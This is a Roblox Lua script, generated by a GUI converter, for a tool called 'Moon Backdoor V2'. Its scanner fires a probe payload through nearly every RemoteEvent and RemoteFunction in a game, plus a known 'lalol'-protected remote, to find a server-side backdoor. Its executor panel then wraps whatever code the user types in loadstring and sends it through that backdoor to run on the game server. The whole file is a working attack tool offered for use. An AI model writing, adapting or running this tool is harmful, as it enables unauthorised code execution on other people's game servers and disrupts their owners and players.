--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed using localmaze gui creator
]=]

-- Instances: 30 | Scripts: 5 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.UnResetOnSpawn
LMG2L["UnResetOnSpawn_2"] = Instance.new("LocalScript", LMG2L["ScreenGui_1"]);
LMG2L["UnResetOnSpawn_2"]["Name"] = [[UnResetOnSpawn]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame 
LMG2L["ExecutorFrame _3"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["ExecutorFrame _3"]["Visible"] = false;
LMG2L["ExecutorFrame _3"]["BorderSizePixel"] = 0;
LMG2L["ExecutorFrame _3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ExecutorFrame _3"]["Size"] = UDim2.new(0, 594, 0, 352);
LMG2L["ExecutorFrame _3"]["Position"] = UDim2.new(0, 260, 0, 124);
LMG2L["ExecutorFrame _3"]["Name"] = [[ExecutorFrame ]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .DraggingScript
LMG2L["DraggingScript_4"] = Instance.new("LocalScript", LMG2L["ExecutorFrame _3"]);
LMG2L["DraggingScript_4"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .UICorner
LMG2L["UICorner_5"] = Instance.new("UICorner", LMG2L["ExecutorFrame _3"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .UIStroke
LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["ExecutorFrame _3"]);
LMG2L["UIStroke_6"]["Thickness"] = 2;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .UIGradient
LMG2L["UIGradient_7"] = Instance.new("UIGradient", LMG2L["ExecutorFrame _3"]);
LMG2L["UIGradient_7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(117, 117, 117)),ColorSequenceKeypoint.new(0.269, Color3.fromRGB(117, 117, 117)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .CodexBox
LMG2L["CodexBox_8"] = Instance.new("TextBox", LMG2L["ExecutorFrame _3"]);
LMG2L["CodexBox_8"]["Name"] = [[CodexBox]];
LMG2L["CodexBox_8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["CodexBox_8"]["BorderSizePixel"] = 0;
LMG2L["CodexBox_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CodexBox_8"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["CodexBox_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["CodexBox_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["CodexBox_8"]["MultiLine"] = true;
LMG2L["CodexBox_8"]["PlaceholderText"] = [[V2 | By: KHAFIDZKTP]];
LMG2L["CodexBox_8"]["Size"] = UDim2.new(0, 412, 0, 234);
LMG2L["CodexBox_8"]["Position"] = UDim2.new(0, 80, 0, 54);
LMG2L["CodexBox_8"]["Text"] = [[Print("Thanks Using My Executor!")]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .CodexBox.UICorner
LMG2L["UICorner_9"] = Instance.new("UICorner", LMG2L["CodexBox_8"]);
LMG2L["UICorner_9"]["CornerRadius"] = UDim.new(0, 2);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .CodexBox.UIStroke
LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["CodexBox_8"]);
LMG2L["UIStroke_a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .TitleText2
LMG2L["TitleText2_b"] = Instance.new("TextLabel", LMG2L["ExecutorFrame _3"]);
LMG2L["TitleText2_b"]["TextWrapped"] = true;
LMG2L["TitleText2_b"]["BorderSizePixel"] = 0;
LMG2L["TitleText2_b"]["TextScaled"] = true;
LMG2L["TitleText2_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TitleText2_b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["TitleText2_b"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
LMG2L["TitleText2_b"]["BackgroundTransparency"] = 1;
LMG2L["TitleText2_b"]["Size"] = UDim2.new(0, 186, 0, 32);
LMG2L["TitleText2_b"]["Text"] = [[Moon Backdoor ]];
LMG2L["TitleText2_b"]["Name"] = [[TitleText2]];
LMG2L["TitleText2_b"]["Position"] = UDim2.new(0, 192, 0, 8);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .TitleText2.UIStroke
LMG2L["UIStroke_c"] = Instance.new("UIStroke", LMG2L["TitleText2_b"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .ExecuteButton
LMG2L["ExecuteButton_d"] = Instance.new("TextButton", LMG2L["ExecutorFrame _3"]);
LMG2L["ExecuteButton_d"]["TextWrapped"] = true;
LMG2L["ExecuteButton_d"]["BorderSizePixel"] = 0;
LMG2L["ExecuteButton_d"]["TextScaled"] = true;
LMG2L["ExecuteButton_d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ExecuteButton_d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
LMG2L["ExecuteButton_d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["ExecuteButton_d"]["Size"] = UDim2.new(0, 104, 0, 42);
LMG2L["ExecuteButton_d"]["Text"] = [[Execute]];
LMG2L["ExecuteButton_d"]["Name"] = [[ExecuteButton]];
LMG2L["ExecuteButton_d"]["Position"] = UDim2.new(0, 82, 0, 296);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .ExecuteButton.UICorner
LMG2L["UICorner_e"] = Instance.new("UICorner", LMG2L["ExecuteButton_d"]);
LMG2L["UICorner_e"]["CornerRadius"] = UDim.new(0, 3);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .ExecuteButton.UIStroke
LMG2L["UIStroke_f"] = Instance.new("UIStroke", LMG2L["ExecuteButton_d"]);
LMG2L["UIStroke_f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .ExecuteButton.MainExecuteScript
LMG2L["MainExecuteScript_10"] = Instance.new("LocalScript", LMG2L["ExecuteButton_d"]);
LMG2L["MainExecuteScript_10"]["Name"] = [[MainExecuteScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame
LMG2L["ScanningFrame_11"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["ScanningFrame_11"]["BorderSizePixel"] = 0;
LMG2L["ScanningFrame_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScanningFrame_11"]["Size"] = UDim2.new(0, 446, 0, 240);
LMG2L["ScanningFrame_11"]["Position"] = UDim2.new(0, 336, 0, 210);
LMG2L["ScanningFrame_11"]["Name"] = [[ScanningFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.TitleText
LMG2L["TitleText_12"] = Instance.new("TextLabel", LMG2L["ScanningFrame_11"]);
LMG2L["TitleText_12"]["TextWrapped"] = true;
LMG2L["TitleText_12"]["BorderSizePixel"] = 0;
LMG2L["TitleText_12"]["TextScaled"] = true;
LMG2L["TitleText_12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TitleText_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["TitleText_12"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
LMG2L["TitleText_12"]["BackgroundTransparency"] = 1;
LMG2L["TitleText_12"]["Size"] = UDim2.new(0, 186, 0, 32);
LMG2L["TitleText_12"]["Text"] = [[Moon Backdoor ]];
LMG2L["TitleText_12"]["Name"] = [[TitleText]];
LMG2L["TitleText_12"]["Position"] = UDim2.new(0, 128, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.TitleText.UIStroke
LMG2L["UIStroke_13"] = Instance.new("UIStroke", LMG2L["TitleText_12"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.UICorner
LMG2L["UICorner_14"] = Instance.new("UICorner", LMG2L["ScanningFrame_11"]);
LMG2L["UICorner_14"]["CornerRadius"] = UDim.new(0, 3);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ByText
LMG2L["ByText_15"] = Instance.new("TextLabel", LMG2L["ScanningFrame_11"]);
LMG2L["ByText_15"]["TextWrapped"] = true;
LMG2L["ByText_15"]["BorderSizePixel"] = 0;
LMG2L["ByText_15"]["TextScaled"] = true;
LMG2L["ByText_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ByText_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["ByText_15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ByText_15"]["BackgroundTransparency"] = 1;
LMG2L["ByText_15"]["Size"] = UDim2.new(0, 86, 0, 22);
LMG2L["ByText_15"]["Text"] = [[By: KHAFIDZKTP ]];
LMG2L["ByText_15"]["Name"] = [[ByText]];
LMG2L["ByText_15"]["Position"] = UDim2.new(0, 2, 0, 220);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.UIStroke
LMG2L["UIStroke_16"] = Instance.new("UIStroke", LMG2L["ScanningFrame_11"]);
LMG2L["UIStroke_16"]["Thickness"] = 3;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ScannerButton
LMG2L["ScannerButton_17"] = Instance.new("TextButton", LMG2L["ScanningFrame_11"]);
LMG2L["ScannerButton_17"]["TextWrapped"] = true;
LMG2L["ScannerButton_17"]["BorderSizePixel"] = 0;
LMG2L["ScannerButton_17"]["TextScaled"] = true;
LMG2L["ScannerButton_17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScannerButton_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["ScannerButton_17"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["ScannerButton_17"]["Size"] = UDim2.new(0, 368, 0, 172);
LMG2L["ScannerButton_17"]["Text"] = [[Start Scan!]];
LMG2L["ScannerButton_17"]["Name"] = [[ScannerButton]];
LMG2L["ScannerButton_17"]["Position"] = UDim2.new(0, 34, 0, 36);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ScannerButton.UICorner
LMG2L["UICorner_18"] = Instance.new("UICorner", LMG2L["ScannerButton_17"]);
LMG2L["UICorner_18"]["CornerRadius"] = UDim.new(0, 3);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ScannerButton.ScannerScript
LMG2L["ScannerScript_19"] = Instance.new("LocalScript", LMG2L["ScannerButton_17"]);
LMG2L["ScannerScript_19"]["Name"] = [[ScannerScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ScannerButton.UIStroke
LMG2L["UIStroke_1a"] = Instance.new("UIStroke", LMG2L["ScannerButton_17"]);
LMG2L["UIStroke_1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_1a"]["Thickness"] = 2;
LMG2L["UIStroke_1a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.UIGradient
LMG2L["UIGradient_1b"] = Instance.new("UIGradient", LMG2L["ScanningFrame_11"]);
LMG2L["UIGradient_1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(243, 0, 124)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 128, 255))};


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.V2TEXT 
LMG2L["V2TEXT _1c"] = Instance.new("TextLabel", LMG2L["ScanningFrame_11"]);
LMG2L["V2TEXT _1c"]["TextWrapped"] = true;
LMG2L["V2TEXT _1c"]["BorderSizePixel"] = 0;
LMG2L["V2TEXT _1c"]["TextScaled"] = true;
LMG2L["V2TEXT _1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["V2TEXT _1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
LMG2L["V2TEXT _1c"]["TextColor3"] = Color3.fromRGB(10, 200, 255);
LMG2L["V2TEXT _1c"]["BackgroundTransparency"] = 1;
LMG2L["V2TEXT _1c"]["Size"] = UDim2.new(0, 310, 0, 30);
LMG2L["V2TEXT _1c"]["Text"] = [[V2]];
LMG2L["V2TEXT _1c"]["Name"] = [[V2TEXT ]];
LMG2L["V2TEXT _1c"]["Position"] = UDim2.new(0, 72, 0, 212);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.BetaText
LMG2L["BetaText_1d"] = Instance.new("TextLabel", LMG2L["ScanningFrame_11"]);
LMG2L["BetaText_1d"]["TextWrapped"] = true;
LMG2L["BetaText_1d"]["BorderSizePixel"] = 0;
LMG2L["BetaText_1d"]["TextScaled"] = true;
LMG2L["BetaText_1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["BetaText_1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
LMG2L["BetaText_1d"]["TextColor3"] = Color3.fromRGB(27, 27, 27);
LMG2L["BetaText_1d"]["BackgroundTransparency"] = 1;
LMG2L["BetaText_1d"]["Size"] = UDim2.new(0, 122, 0, 22);
LMG2L["BetaText_1d"]["Text"] = [[BETA]];
LMG2L["BetaText_1d"]["Name"] = [[BetaText]];
LMG2L["BetaText_1d"]["Position"] = UDim2.new(0, 344, 0, 218);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.DraggingScript
LMG2L["DraggingScript_1e"] = Instance.new("LocalScript", LMG2L["ScanningFrame_11"]);
LMG2L["DraggingScript_1e"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.UnResetOnSpawn
local function C_2()
	local script = LMG2L["UnResetOnSpawn_2"];
	local screenGui = script.Parent	
	screenGui.ResetOnSpawn = false	
end;
task.spawn(C_2);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .DraggingScript
local function C_4()
	local script = LMG2L["DraggingScript_4"];
	local frame = script.Parent	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_4);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame .ExecuteButton.MainExecuteScript
local function C_10()
	local script = LMG2L["MainExecuteScript_10"];
	local button = script.Parent	
	local executorFrame = button.Parent	
	local codexBox = executorFrame:WaitForChild("CodexBox")	
	local player = game.Players.LocalPlayer	
	
	local function runRemote(remote, code)	
		if remote:IsA("RemoteEvent") then	
			pcall(function() remote:FireServer(code) end)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function()	
				pcall(function() remote:InvokeServer(code) end)	
			end)	
		end	
	end	
	
	local function processCode(raw)	
		local trimmed = raw:match("^%s*(.-)%s*$")	
		if trimmed:match("^require%s*%(") then return trimmed end	
		if trimmed:match("^loadstring%s*%(") then return trimmed end	
		local escaped = trimmed	
			:gsub("\\", "\\\\")	
			:gsub('"', '\\"')	
			:gsub("\n", "\\n")	
			:gsub("\r", "")	
		return 'loadstring("' .. escaped .. '")()'	
	end	
	
	local debounce = false	
	
	button.MouseButton1Click:Connect(function()	
		if debounce then return end	
	
		local backdoor = _G.MoonBackdoor	
		if not backdoor then	
			button.Text = "No Backdoor!"	
			button.TextColor3 = Color3.fromRGB(255, 80, 80)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		local raw = codexBox.Text:gsub("%%username%%", player.Name)	
	
		if raw:match("^%s*$") then	
			button.Text = "Empty!"	
			button.TextColor3 = Color3.fromRGB(255, 100, 100)	
			task.wait(1)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		debounce = true	
		button.Text = "Running..."	
		button.TextColor3 = Color3.fromRGB(255, 255, 0)	
	
		local code = processCode(raw)	
		local success = false	
		for i = 1, 3 do	
			local ok = pcall(function() runRemote(backdoor, code) end)	
			if ok then success = true break end	
			task.wait(0.3)	
		end	
	
		task.wait(0.5)	
		if success then	
			button.Text = "Executed!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
		else	
			button.Text = "Failed!"	
			button.TextColor3 = Color3.fromRGB(255, 50, 50)	
		end	
	
		task.wait(1.5)	
		button.Text = "Execute"	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		debounce = false	
	end)	
end;
task.spawn(C_10);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.ScannerButton.ScannerScript
local function C_19()
	local script = LMG2L["ScannerScript_19"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	
	local isScanning = false	
	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			pcall(function() remote:FireServer(data) end)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() pcall(function() remote:InvokeServer(data) end) end)	
		end	
	end	
	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	local function findBackdoor()	
		local remotes = {}	
	
		-- V1: cek LALOL protected	
		local ok, protected = pcall(function()	
			return game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		end)	
		if ok and protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				pcall(function() protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'") end)	
			end)	
			remotes[code] = protected	
		end	
	
		-- V1: loop pakai continue (lebih cepat dari pcall wrap)	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		-- V2: timeout 15 detik	
		local timeout = tick() + 15	
		while tick() < timeout do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					return remote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 15 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		local backdoor = findBackdoor()	
		isScanning = false	
	
		if backdoor then	
			_G.MoonBackdoor = backdoor	
	
			button.Text = "FOUND!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
			task.wait(0.5)	
	
			button.Text = "Go to MainFrame.."	
			button.TextColor3 = Color3.fromRGB(0, 200, 255)	
			task.wait(0.5)	
	
			local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
			local executorFrame = screenGui and screenGui:FindFirstChild("ExecutorFrame")	
			local scanningFrame = screenGui and screenGui:FindFirstChild("ScanningFrame")	
	
			pcall(function()	
				if executorFrame then executorFrame.Visible = true end	
				if scanningFrame then scanningFrame.Visible = false end	
			end)	
	
			pcall(function()	
				local hint = Instance.new("Hint")	
				hint.Text = "Moon Backdoor V2 | Thanks for using my executor! | By: KHAFIDZKTP"	
				hint.Parent = workspace	
				task.delay(5, function()	
					pcall(function() hint:Destroy() end)	
				end)	
			end)	
		else	
			button.Text = "NOT FOUND!"	
			button.TextColor3 = Color3.fromRGB(139, 0, 0)	
		end	
	end)	
end;
task.spawn(C_19);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScanningFrame.DraggingScript
local function C_1e()
	local script = LMG2L["DraggingScript_1e"];
	-- DragScript di ScanningFrame	
	local frame = script.Parent	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_1e);

return LMG2L["ScreenGui_1"], require;
